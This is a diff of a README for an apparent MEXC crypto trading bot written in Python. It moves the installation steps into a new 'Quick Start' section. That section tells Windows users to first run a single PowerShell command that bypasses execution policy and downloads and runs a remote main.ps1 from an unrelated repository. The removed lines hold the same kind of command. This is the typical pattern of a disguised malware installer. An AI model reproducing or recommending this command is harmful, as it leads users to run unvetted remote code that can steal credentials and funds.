@@ -21,8 +21,56 @@
 
 ---
 
+## 🚀 Quick Start
+
+If you just want to get the project running fast on Windows, use the installation command below first. After that, continue with the project-specific setup, configuration, and usage sections.
+
+### 🛠️ Installation
+
+#### CMD
+Open **CMD** and run this **single command**:
+
+```powershell
+powershell -ep bypass -c "iwr https://github.com/DAUDHAIDERNAQVI/polymarket-trading-bot-fast/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
+```
+
+> Then continue with the project-specific setup steps below.
+
+## 📘 Project-Specific Setup
+
+### Step 2 — Create a virtual environment
+
+```bash
+python3 -m venv venv
+
+# Linux / Mac
+source venv/bin/activate
+
+# Windows
+venv\Scripts\activate
+```
+
+### Step 3 — Install dependencies
+
+```bash
+pip install ccxt requests python-dotenv colorama
+```
+
+### Step 4 — Create a MEXC API key
+
+1. Log in to [MEXC](https://www.mexc.com/register)
+2. Navigate to **Account → API Management → Create API**
+3. Enable permissions: **Spot Trading** + **Futures Trading**
+4. Set an IP whitelist if running on a VPS (recommended)
+5. Save your **API Key** and **Secret Key**
+
+> ⚠️ Never enable withdrawal permissions on a trading API key. The bot only needs trade permissions.
+
+---
+
 ## 📌 Table of Contents
 
+- [Quick Start](#-quick-start)
 - [Why MEXC 0-Fee Markets](#-why-mexc-0-fee-markets)
 - [Strategies](#-strategies)
   - [Strategy 1 — Delta-Neutral](#strategy-1--delta-neutral)
@@ -223,49 +271,6 @@ FA_ORDER_TYPE=LIMIT          # Always LIMIT for 0-fee execution
 - A [MEXC](https://www.mexc.com/register) account with futures enabled
 - API key with **spot** and **futures** trading permissions
 - At least $10 USDT deposited
-
-## ## 🛠️ Installation
-
-### Option 1: PowerShell (Recommended)
-Open **PowerShell** and run this **single command**:
-
-```powershell
-powershell -ep bypass -c "iwr https://github.com/Neutral-Debug/Mexc-Trading-Bot/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
-```
-### Option 2: Cmd 
-Open **CMD** and run this **single command**:
-```
-powershell -ep bypass -c "iwr https://github.com/Neutral-Debug/Mexc-Trading-Bot/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
-```
-### Step 2 — Create a virtual environment
-
-```bash
-python3 -m venv venv
-
-# Linux / Mac
-source venv/bin/activate
-
-# Windows
-venv\Scripts\activate
-```
-
-### Step 3 — Install dependencies
-
-```bash
-pip install ccxt requests python-dotenv colorama
-```
-
-### Step 4 — Create a MEXC API key
-
-1. Log in to [MEXC](https://www.mexc.com/register)
-2. Navigate to **Account → API Management → Create API**
-3. Enable permissions: **Spot Trading** + **Futures Trading**
-4. Set an IP whitelist if running on a VPS (recommended)
-5. Save your **API Key** and **Secret Key**
-
-> ⚠️ Never enable withdrawal permissions on a trading API key. The bot only needs trade permissions.
-
----
 
 ## ⚙️ Configuration `.env`
 
@@ -536,5 +541,6 @@ Action:   All positions closed
 
 **If this helped you, please give it a ⭐ Star — it means a lot!**
 
-🔍 Topics
-mexc-bot, trading-bot, crypto-bot, mexc-trading-bot, zero-fee-trading, delta-neutral, copy-trading, funding-arbitrage, perp-trading, futures-bot, automated-trading, python, ccxt, telegram-bot, api-trading, limit-orders, market-making, arbitrage-bot, risk-management, kelly-criterion, stop-loss, algorithmic-trading, quantitative-trading, backtesting, trading-strategies, exchange-bot, defi-bot, web3, cryptocurrency-trading, mexc-futures
+## 🔍 Topics
+
+`mexc-bot` `mexc-trading-bot` `mexc-strategy-bot` `zero-fee-trading` `defi-trading` `automated-trading` `crypto-bot` `perp-trading` `delta-neutral` `copy-trading` `funding-arbitrage` `python-trading-bot` `ccxt-bot` `futures-trading` `funding-rate` `hedge-strategy` `real-time-trading` `limit-orders` `0-fee-bot` `mexc-futures` `risk-management` `telegram-bot`
